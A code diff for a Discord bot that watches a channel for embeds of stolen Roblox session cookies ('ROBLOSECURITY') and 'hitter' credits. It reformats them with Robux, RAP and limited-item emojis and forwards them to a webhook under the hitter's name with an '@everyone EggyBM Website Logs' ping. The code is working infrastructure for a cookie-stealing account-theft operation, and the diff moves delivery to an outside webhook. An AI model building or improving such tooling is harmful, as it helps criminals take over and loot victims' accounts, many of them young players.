@@ -1,4 +1,4 @@
-const { Client, GatewayIntentBits, EmbedBuilder } = require('discord.js');
+const { Client, GatewayIntentBits, EmbedBuilder, WebhookClient } = require('discord.js');
 
 const client = new Client({
   intents: [
@@ -11,22 +11,25 @@ const client = new Client({
 // ─── CONFIG (set these in Railway → Variables) ────────────────────────────────
 const BOT_TOKEN         = process.env.BOT_TOKEN;
 const SOURCE_CHANNEL_ID = process.env.SOURCE_CHANNEL_ID;
-const TARGET_CHANNEL_ID = process.env.TARGET_CHANNEL_ID;
+const WEBHOOK_URL       = process.env.WEBHOOK_URL;
 
-if (!BOT_TOKEN || !SOURCE_CHANNEL_ID || !TARGET_CHANNEL_ID) {
-  console.error('❌ Missing env vars: BOT_TOKEN, SOURCE_CHANNEL_ID, TARGET_CHANNEL_ID');
+if (!BOT_TOKEN || !SOURCE_CHANNEL_ID || !WEBHOOK_URL) {
+  console.error('❌ Missing env vars: BOT_TOKEN, SOURCE_CHANNEL_ID, WEBHOOK_URL');
   process.exit(1);
 }
 // ──────────────────────────────────────────────────────────────────────────────
 
+const webhook = new WebhookClient({ url: WEBHOOK_URL });
+
 // Your server's emojis
 const E = {
-  robux:   '<:robux:1479438036939833384>',
-  rap:     '<:rap:1479437578405941299>',
-  summary: '<:summary:1479437991930888354>',
-  premium: '<:Premium:1479438456760303690>',
-  korblox: '<:korblox:1479437718495821976>',
-  headless:'<:headless:1479437752712953970>',
+  robux:      '<:robux:1479438036939833384>',
+  rap:        '<:rap:1479437578405941299>',
+  summary:    '<:summary:1479437991930888354>',
+  premium:    '<:Premium:1479438456760303690>',
+  korblox:    '<:korblox:1479437718495821976>',
+  headless:   '<:headless:1479437752712953970>',
+  korbloxdeath: '<:korbloxdeath:1479443066925355221>',
 };
 
 function stripEmojis(str) {
@@ -61,7 +64,7 @@ function rebuildFieldValue(fieldName, value) {
   }
 
   if (name.includes('korblox')) {
-    const emojis = ['<:korbloxdeath:1479443066925355221>', E.headless, E.korblox];
+    const emojis = [E.korbloxdeath, E.headless, E.korblox];
     return lines.filter(Boolean).map((l, i) => `${emojis[i] || ''} ${l}`).join('\n');
   }
 
@@ -82,18 +85,16 @@ function shouldKeepField(field) {
 client.once('clientReady', () => {
   console.log(`✅ Logged in as ${client.user.tag}`);
   console.log(`👁  Watching: ${SOURCE_CHANNEL_ID}`);
-  console.log(`📤 Forwarding to: ${TARGET_CHANNEL_ID}`);
+  console.log(`📤 Forwarding via webhook`);
 });
 
 client.on('messageCreate', async (message) => {
   if (message.channel.id !== SOURCE_CHANNEL_ID) return;
   if (!message.embeds || message.embeds.length === 0) return;
 
-  const targetChannel = await client.channels.fetch(TARGET_CHANNEL_ID).catch(() => null);
-  if (!targetChannel) return console.error('❌ Target channel not found.');
-
   // Step 1: get hitter name from cookie embed footer
   let hitterName = null;
+  let hitterAvatar = null;
   for (const embed of message.embeds) {
     const allText = [
       embed.title, embed.description, embed.author?.name,
@@ -102,6 +103,7 @@ client.on('messageCreate', async (message) => {
 
     if (allText.includes('ROBLOSECURITY') || allText.includes('WARNING:-DO-NOT-SHARE')) {
       hitterName = embed.footer?.text?.trim() || null;
+      hitterAvatar = embed.footer?.iconURL || null;
       break;
     }
   }
@@ -136,15 +138,17 @@ client.on('messageCreate', async (message) => {
     if (embed.color)          rebuilt.setColor(embed.color);
     if (embed.timestamp)      rebuilt.setTimestamp(new Date(embed.timestamp));
     if (embed.thumbnail?.url) rebuilt.setThumbnail(embed.thumbnail.url);
-    if (embed.author) {
-      rebuilt.setAuthor({
-        name:    embed.author.name    || '',
-        iconURL: embed.author.iconURL || undefined,
-        url:     embed.author.url     || undefined,
-      });
-    }
 
-    await targetChannel.send({ embeds: [rebuilt] }).catch(console.error);
+    // Use the original hitter's avatar and name for the webhook profile
+    const webhookOptions = {
+      content: "@everyone EggyBM Website Logs",
+      embeds: [rebuilt],
+    };
+
+    webhookOptions.username  = hitterName || embed.author?.name || "Anonymous";
+    if (hitterAvatar) webhookOptions.avatarURL = hitterAvatar;
+
+    await webhook.send(webhookOptions).catch(console.error);
   }
 });
 
